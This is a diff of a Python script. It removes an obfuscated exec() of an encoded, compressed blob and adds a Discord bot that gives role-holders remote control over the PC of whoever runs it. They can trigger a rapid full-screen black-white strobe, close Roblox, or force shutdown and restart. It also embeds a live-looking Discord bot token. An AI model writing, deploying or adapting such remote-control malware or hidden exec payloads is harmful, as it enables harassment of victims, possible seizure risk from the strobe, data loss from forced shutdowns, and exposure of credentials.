@@ -1,4 +1,158 @@
+import os
+import tkinter as tk
+import pygetwindow as gw
+import discord
+from discord.ext import commands
+from threading import Thread, Event
 
-# Python obfuscation by freecodingtools.org
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
+# Replace this with your actual Discord bot token
+TOKEN = "MTMxMjA2MDM0MzQyOTYyNzkxNA.GHsJma.B6HKlVBlYyjE3JwEjZysHxIZ2L_xg2pDXMqL4k"
+
+intents = discord.Intents.default()
+intents.message_content = True
+
+bot = commands.Bot(command_prefix="?", intents=intents)
+
+COMMAND_CHANNEL_ID = 1282705575930761216
+ALLOWED_ROLE_ID = 1325119321361350656
+
+users_running_script = {}  # Dictionary to track users by their Windows username
+flashing_users = {}  # Track flashing status for users
+
+
+def get_windows_user():
+    """Fetches the Windows username of the current user."""
+    return os.getlogin()
+
+
+def create_flash_overlay(stop_event):
+    """
+    Creates a full-screen overlay that alternates between white and black
+    continuously until the stop_event is set.
+    """
+    root = tk.Tk()
+    root.attributes("-fullscreen", True)
+    root.attributes("-topmost", True)
+    root.attributes("-transparentcolor", "black")
+    root.configure(bg="black")
+
+    def flash():
+        if not stop_event.is_set():
+            root.configure(bg="white" if root["bg"] == "black" else "black")
+            root.after(50, flash)
+        else:
+            root.destroy()
+
+    flash()
+    root.mainloop()
+
+
+def close_roblox_window():
+    """
+    Closes the window titled 'Roblox' if it's open.
+    """
+    try:
+        windows = gw.getWindowsWithTitle("Roblox")
+        for window in windows:
+            print(f"Closing window: {window.title}")
+            window.close()
+    except Exception as e:
+        print(f"Error closing Roblox window: {e}")
+
+
+@bot.event
+async def on_ready():
+    print(f"We have logged in as {bot.user}")
+    windows_user = get_windows_user()
+    users_running_script[windows_user] = {"discord_user": bot.user.name}  # Save the associated Discord user name
+    print(f"User {windows_user} registered.")
+
+
+async def check_user_permissions(ctx):
+    """Check if the user has the correct role and is in the correct channel."""
+    if ctx.message.channel.id != COMMAND_CHANNEL_ID:
+        await ctx.send("This command can only be used in the designated command channel.")
+        return False
+
+    if not any(role.id == ALLOWED_ROLE_ID for role in ctx.message.author.roles):
+        await ctx.send("You need the required role to use this command.")
+        return False
+
+    return True
+
+
+@bot.command()
+async def users(ctx):
+    """Show all users running the script."""
+    if await check_user_permissions(ctx):
+        if not users_running_script:
+            await ctx.send("No users are currently running the script.")
+        else:
+            user_list = "\n".join(
+                [f"{username} (Discord: {info['discord_user'] or 'Unknown'})" for username, info in users_running_script.items()]
+            )
+            await ctx.send(f"Users running the script:\n{user_list}")
+
+
+@bot.command()
+async def FlashOn(ctx, user: str):
+    """Start flashing the screen for a specific user."""
+    if await check_user_permissions(ctx):
+        if user in users_running_script:
+            if user in flashing_users and flashing_users[user].is_set():
+                await ctx.send(f"{user} is already flashing.")
+            else:
+                stop_event = Event()
+                flashing_users[user] = stop_event
+                Thread(target=create_flash_overlay, args=(stop_event,)).start()
+                await ctx.send(f"Flashing started for {user}.")
+        else:
+            await ctx.send(f"User {user} is not currently running the script.")
+
+
+@bot.command()
+async def FlashOff(ctx, user: str):
+    """Stop flashing the screen for a specific user."""
+    if await check_user_permissions(ctx):
+        if user in flashing_users and not flashing_users[user].is_set():
+            flashing_users[user].set()
+            await ctx.send(f"Flashing stopped for {user}.")
+        else:
+            await ctx.send(f"{user} is not currently flashing.")
+
+
+@bot.command()
+async def CloseRoblox(ctx, user: str):
+    """Close the Roblox window for a specific user."""
+    if await check_user_permissions(ctx):
+        if user in users_running_script:
+            close_roblox_window()
+            await ctx.send(f"Successfully closed Roblox window for {user}.")
+        else:
+            await ctx.send(f"User {user} is not currently running the script.")
+
+
+@bot.command()
+async def Shutdown(ctx, user: str):
+    """Shut down the PC for a specific user."""
+    if await check_user_permissions(ctx):
+        if user in users_running_script:
+            await ctx.send(f"Shutting down {user}'s PC...")
+            os.system("shutdown /s /t 1")
+        else:
+            await ctx.send(f"User {user} is not currently running the script.")
+
+
+@bot.command()
+async def Restart(ctx, user: str):
+    """Restart the PC for a specific user."""
+    if await check_user_permissions(ctx):
+        if user in users_running_script:
+            await ctx.send(f"Restarting {user}'s PC...")
+            os.system("shutdown /r /t 1")
+        else:
+            await ctx.send(f"User {user} is not currently running the script.")
+
+
+# Start the bot
+bot.run(TOKEN)
